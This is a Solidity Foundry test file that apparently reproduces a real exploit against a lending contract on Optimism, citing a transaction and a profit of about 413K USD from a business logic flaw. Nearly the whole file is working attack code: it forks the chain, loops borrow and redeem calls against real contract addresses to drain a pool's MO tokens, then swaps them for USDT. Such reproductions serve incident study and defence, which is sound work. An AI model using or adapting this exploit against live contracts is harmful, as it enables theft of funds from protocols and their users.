// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// TX : https://phalcon.blocksec.com/explorer/tx/optimism/0x4ec3061724ca9f0b8d400866dd83b92647ad8c943a1c0ae9ae6c9bd1ef789417
// GUY : https://twitter.com/0xNickLFranklin/status/1768184024483430523
// Profit : ~413K USD,but i get more
// REASON : Bussiness Logic Flaw

interface Loan  {
    function borrow(uint256 amount,uint256 duration) external;
    function redeem(uint256 index) external;
    function borrowOrdersCount(address account) external view returns (uint256);
}
interface Relation  {
    function bind(address referrer) external;
    function hasBinded(address user) external view returns (bool) ;
}

contract contractTest is Test {

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 constant MO = IERC20(0x61445Ca401051c86848ea6b1fAd79c5527116AA1);
    IERC20 constant USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
    Loan constant LOAN = Loan(0xAe7b6514Af26BcB2332FEA53B8Dd57bc13A7838E);
    address constant approve_proxy = 0x9D8355a8D721E5c79589ac0aB49BC6d3e0eF7C3F;
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x9eADD135641f8b8cC4E060D33d63F8245f42bE59);
    Uni_Pair_V2 UniV2Pair = Uni_Pair_V2(0x4a6E0fAd381d992f9eB9C037c8F78d788A9e8991);
    Relation RELAT = Relation(0xb03B377d524AF7D5b3769414d969FFe627C062F9);
    uint256 mo_balance;
    function setUp() public {
        cheats.createSelectFork("optimism", 117395511);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 6);
        deal(address(MO),address(this),62147724);
        Money bind_contract = new Money();
        bind_contract.approve(address(this));
        // Here can bind some reffer address but can't find the first reffer = =
        // RELAT.bind(address(bind_contract));
        MO.approve(address(approve_proxy), type(uint256).max);
        USDT.approve(address(approve_proxy), type(uint256).max);
        mo_balance = MO.balanceOf(address(this));
        // console.log(MO.balanceOf(address(UniV2Pair)));
        uint256 i = 0;
        while(i < 80){
            try this.do_some_borrow(i){} catch {break;}
            i ++;
        }
        LOAN.borrow(MO.balanceOf(address(UniV2Pair)) - 1,0);
        // console.log(MO.balanceOf(address(UniV2Pair)));
        MO.approve(address(Router),type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(MO);
        path[1] = address(USDT);
        // Router.swapExactTokensForTokens(MO.balanceOf(address(this)), 0, path, address(this), block.timestamp + 100);
        MO.transfer(address(Router),10); // need some token for pair to send.
        Router.swapExactTokensForTokens(3, 0, path, address(this), block.timestamp + 100);
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 6);
    }

    function do_some_borrow(uint256 i) public{
        LOAN.borrow(mo_balance,0);
        LOAN.redeem(i);
    }

}

contract Money {
    IERC20 constant MO = IERC20(0x61445Ca401051c86848ea6b1fAd79c5527116AA1);
    function approve(address a) public{
        MO.approve(address(a), type(uint256).max);
    }
}